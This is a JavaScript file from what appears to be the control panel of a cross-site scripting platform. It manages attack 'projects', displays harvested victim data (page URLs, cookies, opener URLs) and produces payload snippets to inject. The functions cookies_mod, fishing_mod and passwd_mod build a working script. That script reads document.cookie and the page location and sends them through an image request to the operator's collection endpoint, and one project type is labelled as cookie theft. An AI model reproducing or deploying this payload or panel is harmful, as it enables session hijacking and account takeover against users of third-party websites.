$("#fishing").attr("class", "active");
$("#xss").attr("class", "active");


function getLocalTime(nS) {
    var date = new Date(nS);
    Y = date.getFullYear() + '-';
    M = (date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date
        .getMonth() + 1) + '-';
    D = date.getDate() + ' ';
    h = date.getHours() + ':';
    m = date.getMinutes();
    return Y + M + D + h + m;
}

function del(id) {
    $.ajax({
        url: 'delXss.html',
        dataType: 'json',
        data: {
            id: id
        },
        success: function(data) {
            history.go(0);
        }
    });
}

function config(id) {
    $('#xssConfigInfos').empty();
    var path = $("#urlPath").val();
    var uid = $("#user_id").val();
    var code = cookies_mod(path, id, uid);
    console.log(code);
    $('#xssConfigInfos').append(code);
    $('#xssConfigInfo').modal();
}

function see(id) {
    $.ajax({
        url: 'findXssInfo.html',
        dataType: 'json',
        data: {
            id: id
        },
        success: function(data) {
            console.log(data);
            var d = data.model.result;
            var _h = '';
            for (var i = 0; i < d.length; i++) {
                var id = d[i].id;
                var create_time = getLocalTime(d[i].create_time);
                var info = d[i].list.split("|&|");
                _h += '<p><span style="font-weight: bold;">id : </span>' + id + '</p>';
                _h += '<p><span style="font-weight: bold;">time : </span>' + create_time + '</p>';
                _h += '<p><span style="font-weight: bold;">location :</span> ' + info[0] + '</p>';
                _h += '<p><span style="font-weight: bold;">toplocation :</span> ' + info[1] + '</p>';
                _h += '<p><span style="font-weight: bold;">cookie : </span>' + info[2] + '</p>';
                _h += '<p><span style="font-weight: bold;">opener : </span>' + info[3] + '</p>';
                _h += '<p><hr style="border: 1px solid #CCCCCC;"></p>';
            };
            $('#xssInfo_lists').html(_h);
            $('#xssInfo_list').modal();
        }
    });
}

$("#addXss").click(function() {
    $('#modal_id').modal();
});

$("#addXsss").click(function() {
    var xssTitle = $("#xssTitle").val();
    var xssDesc = $("#xssDesc").val();
    var types = $("input[name='types']:checked").val();
    $.ajax({
        url: 'addXss.html',
        type:'post',
        dataType: 'json',
        data: {
            xssTitle: xssTitle,
            xssDesc: xssDesc,
            types: types
        },
        success: function(data) {
            console.log(data);
            history.go(0);
        }
    });
});

$.ajax({
    url: 'queryXss.html',
    dataType: 'json',
    success: function(data) {
        var d = data.model.result;
        for (var i = 0; i < d.length; i++) {
            var time = getLocalTime(d[i].create_time);
            var _h = html(d[i].id, d[i].title, d[i].detail, d[i].num, d[i].type, time);
            $("#tablelist").append(_h);
        }
    }
});

function html(id, title, detail, num, type, create_time) {
    var _h = '';
    _h += '<tr>';
    _h += '<td style="text-align: center;">' + id + '</td>';
    _h += '<td style="text-align: center;">' + title + '</td>';
    _h += '<td style="text-align: center;">' + detail + '</td>';
    if(type=="1"){
        _h += '<td style="text-align: center;">cookies盗取</td>';
    }

    _h += '<td style="text-align: center;">' + num + '</td>';
    _h += '<td style="text-align: center;"><span style="cursor: pointer;color: #3C8DBC; font-weight: bold;" onclick="see(' + id + ')">点击查看</span></td>';
    _h += '<td style="text-align: center;">' + create_time + '</td>';
    _h += '<td style="text-align: center;"><span class="label label-warning" style=" cursor: pointer;" onclick="config(' + id + ')">config</span>&nbsp;&nbsp;<span class="label label-danger" style=" cursor: pointer;" onclick="del(' + id + ')">delete</span></td>';
    _h += '</tr>';
    return _h;
}

function cookies_mod(path, id, uid) {
    var _js = '(function(){var f=new Image,a=escape,b;try{b=document.location.href}catch(e){b=""}a="' + path + 'fishing/xssServer.html?id=' + id + '&uid=' + uid + '&type=1&location="+a(b)+"&toplocation="+escape(void 0)+"&cookie=";b=escape;var c;try{c=document.cookie}catch(e){c=""}c=a+b(c)+"&opener=";var a=escape,d;try{d=window.opener&&window.opener.location.href?window.opener.location.href:""}catch(e){d=""}f.src=c+a(d)})();';
    return _js;
}

function fishing_mod(path) {
    var _js = '(function(){var f=new Image,a=escape,b;try{b=document.location.href}catch(e){b=""}a="' + path + 'fishing/xssServer.html?id=1&type=1&location="+a(b)+"&toplocation="+escape(void 0)+"&cookie=";b=escape;var c;try{c=document.cookie}catch(e){c=""}c=a+b(c)+"&opener=";var a=escape,d;try{d=window.opener&&window.opener.location.href?window.opener.location.href:""}catch(e){d=""}f.src=c+a(d)})();';
    return _js;
}

function passwd_mod(path) {
    var _js = '(function(){var f=new Image,a=escape,b;try{b=document.location.href}catch(e){b=""}a="' + path + 'fishing/xssServer.html?id=1&type=1&location="+a(b)+"&toplocation="+escape(void 0)+"&cookie=";b=escape;var c;try{c=document.cookie}catch(e){c=""}c=a+b(c)+"&opener=";var a=escape,d;try{d=window.opener&&window.opener.location.href?window.opener.location.href:""}catch(e){d=""}f.src=c+a(d)})();';
    return _js;
}
